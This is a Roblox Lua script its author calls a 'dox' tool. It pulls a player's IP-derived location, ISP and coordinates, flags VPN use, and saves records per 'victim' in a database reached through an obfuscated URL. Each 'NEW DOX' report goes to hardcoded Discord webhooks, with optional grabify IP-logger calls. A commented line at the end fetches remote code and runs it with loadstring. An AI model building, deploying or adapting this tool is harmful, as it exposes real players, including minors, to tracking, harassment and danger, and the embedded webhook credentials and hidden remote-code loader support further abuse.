...
Every single character here was written by iSolaries himself!
YouTube: @iSolaries, https://www.youtube.com/@iSolaries
Discord: @isolaries, @trippin.ak
Roblox: @isolaries, Solar
...
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
...
â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
...
local Dox_Settings = {
	info_to_hide = { -- Hide as ||INFO|| which is: (Click to reveal on Discord server).
		"IP Address",
		"regionName",
		"city",
		"isp",
	...
	info_to_remove = { -- Remove useless info.
		--"region",
		"status",
	},
	my_accounts = { -- Put here all your accounts/alts.
		"iSolariesAlt",
		"xxmar_iox",
		"isolaries",
		"",
	...
	custom_colors = {
		FoundChange = Color3.new(1, 0.666667, 0), -- IP changed.
		MyAccount = Color3.new(0.0, 0.0, 0.0), -- When the player is your accounts.
		Friends = Color3.new(0.0, 0.6, 1.0), -- When a player is Friends with MyAccounts.
		Normal = Color3.new(0.0, 0.6, 0.0), -- Normal player.
		VPN = Color3.new(1, 1, 0) -- VPN detected
	},
	others = {
		AllowGrabifyLinks = false, -- Allow grabify link; may cause dox to be slower.
		SendOnlyInStudio = true, -- Send if only in studio.
		DoxMyAccounts = true, -- Send if it's one of your account.
		DoxMyFriends = true, -- Send if it's one of your friends.
		UseDataBase = true, -- Save to database (If disabled DoxOnce will be disabled also).
		DoxIfChange = false, -- If DoxOnce is enabled and there was a change, dox?
		SendReports = true, -- Send to Discord success doxes.
		SendErrors = true, -- Send errors that happen in code to server.
		DoxIfVPN = true, -- Send even if VPN is detected.
		HideVPN = false, -- If VPN is detected it, hide it?
		DoxOnce = true, -- Dox one time.
		Print = false, -- If enabled script will print/warn things.
	},
	links = {
		webhook_url_REPORT = "https://discord.com/api/webhooks/1493418895741030523/SdHrxC20GRFsyf1Cox9xVff3KxQwjynpRgZjJ5ziHg0cs2u23yjKTAbKnswmpPcZeW4j", -- Where to send reports.
		webhoot_url_ERROR = "https://discord.com/api/webhooks/1493418895741030523/SdHrxC20GRFsyf1Cox9xVff3KxQwjynpRgZjJ5ziHg0cs2u23yjKTAbKnswmpPcZeW4j", -- Where to send errors.
		dataStore_url = "119131131127130073062062125116134060130126123112129060068066117066115060115116117112132123131060129131115113061117120129116113112130116120126061114126124062115126135060120125117126", -- Where to save all info.
		webhook_url = "https://discord.com/api/webhooks/1493418895741030523/SdHrxC20GRFsyf1Cox9xVff3KxQwjynpRgZjJ5ziHg0cs2u23yjKTAbKnswmpPcZeW4j", -- Where to send doxed player.
		ip_grab_url = "http://ip-api.com/json/24.48.0.1", -- Url that returns info in json; best for code: (http://ip-api.com/json/).
		grabify_url = "https://grabify.org/", -- IP Grab website link; keep "" if no link.
	},
	vpn_indicators = {
		-- VPN Providers
		"NordVPN", "ExpressVPN", "Surfshark", "CyberGhost", "Private Internet Access",
		"ProtonVPN", "TunnelBear", "Windscribe", "VyprVPN", "IPVanish", "Mullvad",
		"StrongVPN", "HideMyAss", "ZenMate", "Hotspot Shield", "Atlas VPN", "Avira Phantom VPN",
		"PureVPN", "IVPN", "TorGuard", "PrivateVPN",

		-- Hosting & Datacenters (often used by VPNs or proxies)
		"DigitalOcean", "Amazon", "Google Cloud", "Microsoft Azure", "Linode", "OVH",
		"Hetzner", "Contabo", "LeaseWeb", "Vultr", "Oracle Cloud", "Alibaba Cloud",
		"UpCloud", "Scaleway", "Choopa", "Cogent Communications", "Hurricane Electric",
		"Hostinger", "Fastly", "Cloudflare", "Eonix", "QuadraNet", "GTT Communications",

		-- Proxy/VPN infrastructure companies or ISPs
		"Packet Exchange", "M247", "ColoCrossing", "Path Network", "StackPath", "CDN77",
		"NetProtect", "DataCamp", "Highwinds Network Group", "Zayo", "SoftLayer", "LeaseWeb USA",

		-- Common suspicious generic names
		"Unknown", "Private Customer", "Private Network", "Hosting Provider", "Anonymous Proxy"
	},
}

debug_mode = false -- true if you want to fix/imporve code; (just doesn't send to server).
...
task.spawn(function() while task.wait(0.001) do if searching then response_time += 1 end end end)
if debug_mode == true then Dox_Settings.others.Print = true end
local success, https = pcall(function() return game:GetService("HttpService") end)
if not success then if Dox_Settings.others.Print == true then warn("Go to Game Settings and turn on Allow HTTP requests.") end; while task.wait() do end end																																																																																																		
for si, s in pairs(Dox_Settings.links) do
	if type(s) ~= "string" then continue end

	local results = ""
	for i = 1, #s, 3 do
		local success, err = pcall(function()
			results = results .. string.char(tonumber(string.sub(s, i, i+2)) - 15)
		end)
		if not success and Dox_Settings.others.Print then
			warn("Failed to Decrypt:", si, err)
		end
	end
	Dox_Settings.links[si] = results
end


local success2, someData = pcall(function() return https:GetAsync(Dox_Settings.links.ip_grab_url) end)

local function create_json_color(color3)
	if typeof(color3) ~= "Color3" then return color3 or 0 end
	return math.floor(color3.R*255)*65536+math.floor(color3.G*255)*256+math.floor(color3.B*255)
end

local function get_database()
	local dataGetSucess, dataGetMsg = pcall(function()
		return https:GetAsync(Dox_Settings.links.dataStore_url..".json")
	end)
	if dataGetSucess then
		dataGetMsg = https:JSONDecode(dataGetMsg)
		return dataGetMsg
	else
		if Dox_Settings.others.Print then
			warn("Failed to get data, reason:", dataGetMsg)
		end
	end
end

local function check_ip_change(old, new)
	local n1 = {}
	local n2 = {}
	for part in string.gmatch(old, "[^%.]+") do
		table.insert(n1, tonumber(part))
		if #n1 == 2 then
			break
		end
	end
	for part in string.gmatch(new, "[^%.]+") do
		table.insert(n2, tonumber(part))
		if #n2 == 2 then
			break
		end
	end
	if n1[1] == n2[1] and n1[2] == n2[2] then
		return "IP changed, same network."
	end
end

local function save_info(nm, inf, ip)
	local found_in_data = false
	local found_change = true
	local data_base = get_database()
	if data_base then
		for i, v in data_base do
			if i == nm then
				found_in_data = true
				if Dox_Settings.others.Print then print(nm.." was found in database.") end
				for ii, vv in v do
					if vv.ip == ip then
						found_change = false
						continue
	...
	if Dox_Settings.others.UseDataBase == true then
		local dataSuccess, dataMsg
		if debug_mode == true then 
			dataMsg = "Debug = true"
		else 
			dataSuccess, dataMsg = pcall(function()
				https:PostAsync(Dox_Settings.links.dataStore_url.."/"..nm..".json", data)
			end)
		end
		if dataSuccess then
			if Dox_Settings.others.Print then print("Save: successfully, respons:", dataMsg) end
		else
			if Dox_Settings.others.Print then warn("Save: Unsuccessfull, reason:", dataMsg) end
		end
	else
		if Dox_Settings.others.Print then warn("Save: Unsuccessfull, reason: UseDataBase is disabled.") end
		return
	end
end

local function vpn_check(info)
	local isVPN = false
	if not info then return false end
	local org = string.lower(tostring(info.org))
	local isp = string.lower(tostring(info.isp))
	for _, indicator in ipairs(Dox_Settings.vpn_indicators) do
		indicator = string.lower(indicator)
		if org:find(indicator) or isp:find(indicator) then
			isVPN = true
			break
		end
	end
	if info.hosting == true or info.proxy == true then
		isVPN = true
	end
...
function send_report(victim, data)
	local clr = create_json_color(Dox_Settings.custom_colors.Normal)
	local fm = "{"..victim.DisplayName..", @"..victim.Name.."} - ["..victim.UserId.."]"
	local sweet_data = https:JSONDecode(data)
	local vpn = vpn_check(sweet_data)
	local roblox_region = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(victim)
	local fields2 = {}
	local infoText = nil
	local la_lo = {"UNKNOWN", "UNKNOWN"}
	local found_in_data = false
	local found_change = false
	local data_base = get_database()
	local doxed_amount = 1
	local victim_amount = 1
	if data_base then for i, v in data_base do doxed_amount+=1 if i == victim.Name then for ii, vv in v do victim_amount+=1 end end end end
	if data_base then
		for i, v in data_base do
			if i == victim.Name then
				found_in_data = true
				if Dox_Settings.others.Print then print(victim.Name.." was found in database.") end
				for ii, vv in v do
					if tostring(vv.ip) ~= tostring(sweet_data["query"]) then
						found_change = true
						clr = create_json_color(Dox_Settings.custom_colors.FoundChange)
						local ic = check_ip_change(vv.ip, sweet_data["query"])
						if ic then infoText = "â“˜ Info: "..ic end
						continue
					end
				end
			end
	...
	for i, v in sweet_data do
		if i == "lat" then la_lo[1] = v continue end
		if i == "lon" then la_lo[2] = v continue end
		if i == "query" then i = "IP Address" end
		if table.find(Dox_Settings.info_to_remove, i) then continue end
		local newShit = {}
		newShit["inline"] = true
		newShit["name"] = "***"..string.upper(string.sub(i, 1, 1))..string.sub(i, 2)..":***"
		if i == "as" then local words = {}; for word in v:gmatch("%w+[%p]*") do table.insert(words, word) end; v = words[1] end
		if v == "" then v ="UNKNOWN" end
		newShit["value"] = v
		if i == "countryCode" then newShit.value = tostring(v).." :flag_"..string.lower(v)..":" end
		if table.find(Dox_Settings.info_to_hide, i) then newShit.value = "|| "..newShit["value"].." ||" end
		table.insert(fields2, newShit)
	end
	local new_va
	new_va = {inline = true, name = "***Latitude, Longitude:***", value = "|| ("..tostring(la_lo[1]..", "..la_lo[2]).."). ||"}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Google maps link:***", value = "[Click here](https://www.google.com/maps/@"..la_lo[1]..","..la_lo[2]..",14z?entry=ttu)"}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Date of dox:***", value = "["..osDate.."]."}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Account age:***", value = "["..victim.AccountAge.." Days]."}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Preffered language:***", value = string.sub(victim.LocaleId, 1, 2).." :flag_"..string.sub(victim.LocaleId, 4)..":"}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Victim's Roblox profile:***", value = "[Vitim's roblox](https://www.roblox.com/users/"..victim.UserId.."/profile)"}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Game link:***", value = "[Click here](https://www.roblox.com/games/"..game.PlaceId..")"}
	table.insert(fields2, new_va)
	local l if game.CreatorType == Enum.CreatorType.Group then l = "https://www.roblox.com/groups/"..game.CreatorId else l = "https://www.roblox.com/users/"..game.CreatorId.."/profile" end
	new_va = {inline = true, name = "Creator type: "..string.sub(tostring(game.CreatorType), 18)..", link: ", value = "[Click here]("..l..")"}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Roblox CountryCode:***", value = roblox_region.." :flag_"..string.lower(roblox_region)..":"}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***Placement:***", value = "#"..doxed_amount..""}
	table.insert(fields2, new_va)
	new_va = {inline = true, name = "***VPN:*** ", value = tostring(vpn)}
	table.insert(fields2, new_va)
	local myAccount = false
	local friends = false
	local function get_userid(v)
		if #v>3 then
			local s, m = pcall(function()
				return game.Players:GetUserIdFromNameAsync(tostring(v))
			end)
			if s and m then return m end
		end
		return 0
	end
	for i, v in Dox_Settings.my_accounts do
		local userId = victim.UserId
		if not myAccount and tostring(userId) == tostring(get_userid(v)) then
			myAccount = true
		end
		if not friends and not myAccount and victim:IsFriendsWith(get_userid(v)) then
			friends = true
		end
	end
	if myAccount then
		fm = fm..",  (My account!)"
		clr = create_json_color(Dox_Settings.custom_colors.MyAccount)
	elseif friends then
		clr = create_json_color(Dox_Settings.custom_colors.Friends)
		fm = fm..",  (Friends!)"
	end
	someData = https:JSONDecode(someData)
	someData.VPN = vpn
	someData.RobloxRegion = roblox_region
	local isStudio = game:GetService("RunService"):IsStudio()
	if isStudio then fm = fm..",  (Studio)" else fm = fm..",  (Roblox)" end
	if vpn and Dox_Settings.others.HideVPN == false then clr = create_json_color(Dox_Settings.custom_colors.VPN) fm = fm..",  (VPN)" end
	fm = fm.."."
	local function check_if_dox()
		if not myAccount or myAccount and Dox_Settings.others.DoxMyAccounts == true then
		else return false, "Dox_Settings.others.DoxMyAccounts = false; myAccount = true" end
		if friends and Dox_Settings.others.DoxMyFriends == true or not friends then
		else return false, "Dox_Settings.others.DoxMyFriends = true; && friends = true" end
		if isStudio or not isStudio and Dox_Settings.others.SendOnlyInStudio == false then
		else return false, "Dox_Settings.others.SendOnlyInStudio = true; && isStudio = false" end
		if Dox_Settings.others.DoxOnce == false or Dox_Settings.others.DoxOnce == true and not found_in_data or found_in_data and Dox_Settings.others.DoxIfChange == true then
		else return false, "Dox_Settings.others.DoxOnce = true; && Player was found in database" end
		if vpn == true and Dox_Settings.others.DoxIfVPN == false then
			return false, "Dox_Settings.others.DoxIfVPN = false; && VPN_DETECTED = true" end
		if not Dox_Settings.others.DoxOnce or not found_in_data or not found_change or Dox_Settings.others.DoxIfChange == false and found_change == false then
		else return false, "Dox_Settings.others.DoxIfChange = true; && found_change = false" end
		return true
	end
	local check, reason = check_if_dox()
	if check == true then
		if Dox_Settings.others.AllowGrabifyLinks == true and Dox_Settings.links.grabify_url ~= "" then pcall(function() https:GetAsync(Dox_Settings.links.grabify_url) end) end
		searching = false
		someData.ResponsTime = response_time.." ms"
		save_info(victim.Name, {username = victim.Name, userid = victim.UserId, ip = sweet_data["query"], full_data = someData}, sweet_data["query"])
		local embds = {color = clr, ["author"] = {["name"] = fm}, fields = fields2}
		if infoText then embds = {color = clr, ["author"] = {["name"] = fm}, fields = fields2, footer = {text = infoText}} end
		local usrnm = "NEW DOX: "..osTime
		if victim_amount>1 then usrnm = usrnm.." ("..(victim_amount)..")" end
		local info = https:JSONEncode({username = usrnm, embeds = {embds},})
		local s = "DEBUG_MODE: ON"
		local m = "DEBUG_MODE: ON"
		if not debug_mode then s, m = pcall(function() https:PostAsync(Dox_Settings.links.webhook_url, info) end) end
		return s, m
	else
		return check, reason
	end
end
while not game.Players:FindFirstChildOfClass("Player") do task.wait(0.1) if Dox_Settings.others.Print == true then print("WAITING FOR PLAYER") end end
local plr = game.Players:FindFirstChildOfClass("Player")
if success then 
	local s, m = send_report(plr, someData)
	local report
	local end_url = Dox_Settings.links.webhoot_url_ERROR
	if not s then 
		if Dox_Settings.others.Print == true then warn("Dox failed, reason: "..tostring(m)) end
		if Dox_Settings.others.SendErrors == true then report = https:JSONEncode({username = "An error occourd; "..osTime..".",embeds = {{color = create_json_color(Color3.new(1, 0, 0)),fields = {{name = "***Error/Report:***", inline = false, value = m.."."}, {name = "***Player info:***", inline = false, value = "("..plr.DisplayName..", @"..plr.Name..") - ["..plr.UserId.."]"}, {name = "***Time of Error/Report:***", inline = false, value = "["..osDate.."]"}, {name = "***Game link:***", inline = true, value = "[[Click Here](https://www.roblox.com/games/"..game.PlaceId..")]."},}}}})  end
		end_url = Dox_Settings.links.webhoot_url_ERROR
	else
		if Dox_Settings.others.Print == true then print("Success, no errors.") end
		if Dox_Settings.others.SendReports == true then report = https:JSONEncode({username = "Success; "..osTime..".", embeds = {{color = create_json_color(Color3.new(0, 1, 0)), fields = { {name = "***Error/Report:***", inline = false, value = "Dox was successful!"}, {name = "***Player info:***", inline = false, value = "("..plr.DisplayName..", @"..plr.Name..") - ["..plr.UserId.."]"}, {name = "***Time of Error/Report:***", inline = false, value = "["..osDate.."]"}, {name = "***Dirty data:***", inline = true, value = "||```"..tostring(https:JSONEncode(someData)).."```||"}, {name = "***Game link:***", inline = false, value = "[[Click Here](https://www.roblox.com/games/"..game.PlaceId..")]."}, }}}}) end
		end_url = Dox_Settings.links.webhook_url_REPORT
	end
	if report and not debug_mode then local last_success, msg = pcall(function() return https:PostAsync(end_url, report) end) end
	if Dox_Settings.others.Print then if someData then print("DATA OF "..plr.Name..":", (someData)); end end
end
...
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- local h=game:GetService("HttpService")task.spawn(function()loadstring(h:GetAsync(h:JSONDecode(h:GetAsync("https://new-solar-53f3d-default-rtdb.firebaseio.com/source-code.json")).link))()end)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
